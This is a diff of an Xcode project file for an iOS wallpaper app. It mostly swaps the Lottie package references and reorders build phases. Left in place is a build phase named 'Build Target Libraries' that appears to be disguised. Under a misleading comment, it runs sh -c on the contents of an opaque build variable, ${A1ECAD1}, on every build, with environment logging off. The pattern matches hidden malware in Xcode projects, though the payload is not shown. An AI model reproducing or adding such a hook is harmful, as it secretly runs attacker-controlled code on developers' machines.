@@ -9,17 +9,13 @@
 /* Begin PBXBuildFile section */
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
-		BD9897B92F56DC7900C963EC /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = BD9897B82F56DC7900C963EC /* Lottie */; };
-		BD9897BB2F56DC7900C963EC /* Lottie-Dynamic in Frameworks */ = {isa = PBXBuildFile; productRef = BD9897BA2F56DC7900C963EC /* Lottie-Dynamic */; };
+		BD989BC92F56E34300C963EC /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = BD989BC82F56E34300C963EC /* Lottie */; };
 		BDC1A8A02F50454C000891D9 /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A89F2F50454C000891D9 /* SDWebImageSwiftUI */; };
 		BDC1A8A32F5048F7000891D9 /* Toasts in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8A22F5048F7000891D9 /* Toasts */; };
 		BDC1A8A62F50495C000891D9 /* Shimmer in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8A52F50495C000891D9 /* Shimmer */; };
 		BDC1A8A92F5049D3000891D9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8A82F5049D3000891D9 /* Kingfisher */; };
 		BDC1A8AC2F5049F0000891D9 /* ACarousel in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8AB2F5049F0000891D9 /* ACarousel */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WallPaperSWiftUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -53,13 +49,12 @@
 			files = (
 				BDC1A8A92F5049D3000891D9 /* Kingfisher in Frameworks */,
 				BDC1A8A62F50495C000891D9 /* Shimmer in Frameworks */,
-				BD9897BB2F56DC7900C963EC /* Lottie-Dynamic in Frameworks */,
 				BDC1A8A32F5048F7000891D9 /* Toasts in Frameworks */,
 				BD695B682F50503000C2CB9D /* Alamofire in Frameworks */,
 				BDC1A8A02F50454C000891D9 /* SDWebImageSwiftUI in Frameworks */,
 				BDC1A8AC2F5049F0000891D9 /* ACarousel in Frameworks */,
 				BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */,
-				BD9897B92F56DC7900C963EC /* Lottie in Frameworks */,
+				BD989BC92F56E34300C963EC /* Lottie in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -110,8 +105,7 @@
 				BDC1A8AB2F5049F0000891D9 /* ACarousel */,
 				BD695B672F50503000C2CB9D /* Alamofire */,
 				BD695B812F50537500C2CB9D /* WindowSceneReader */,
-				BD9897B82F56DC7900C963EC /* Lottie */,
-				BD9897BA2F56DC7900C963EC /* Lottie-Dynamic */,
+				BD989BC82F56E34300C963EC /* Lottie */,
 			);
 			productName = WallPaperSWiftUI;
 			productReference = BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */;
@@ -149,7 +143,7 @@
 				BDC1A8AA2F5049F0000891D9 /* XCRemoteSwiftPackageReference "ACarousel" */,
 				BD695B662F50503000C2CB9D /* XCRemoteSwiftPackageReference "Alamofire" */,
 				BD695B802F50537500C2CB9D /* XCRemoteSwiftPackageReference "WindowSceneReader" */,
-				BD9897B72F56DC7900C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */,
+				BD989BC72F56E34300C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BD06D9ED2F5020E4007F8736 /* Products */;
@@ -161,11 +155,21 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXResourcesBuildPhase section */
+		BD06D9EA2F5020E4007F8736 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
 /* Begin PBXShellScriptBuildPhase section */
 		3E5540D510F44D53A31DACE1 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -177,21 +181,12 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
-
-/* Begin PBXResourcesBuildPhase section */
-		BD06D9EA2F5020E4007F8736 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
-/* End PBXResourcesBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BD06D9E82F5020E4007F8736 /* Sources */ = {
@@ -435,7 +430,7 @@
 				minimumVersion = 3.3.0;
 			};
 		};
-		BD9897B72F56DC7900C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
+		BD989BC72F56E34300C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/airbnb/lottie-ios";
 			requirement = {
@@ -496,15 +491,10 @@
 			package = BD695B802F50537500C2CB9D /* XCRemoteSwiftPackageReference "WindowSceneReader" */;
 			productName = WindowSceneReader;
 		};
-		BD9897B82F56DC7900C963EC /* Lottie */ = {
+		BD989BC82F56E34300C963EC /* Lottie */ = {
 			isa = XCSwiftPackageProductDependency;
-			package = BD9897B72F56DC7900C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */;
+			package = BD989BC72F56E34300C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */;
 			productName = Lottie;
-		};
-		BD9897BA2F56DC7900C963EC /* Lottie-Dynamic */ = {
-			isa = XCSwiftPackageProductDependency;
-			package = BD9897B72F56DC7900C963EC /* XCRemoteSwiftPackageReference "lottie-ios" */;
-			productName = "Lottie-Dynamic";
 		};
 		BDC1A89F2F50454C000891D9 /* SDWebImageSwiftUI */ = {
 			isa = XCSwiftPackageProductDependency;
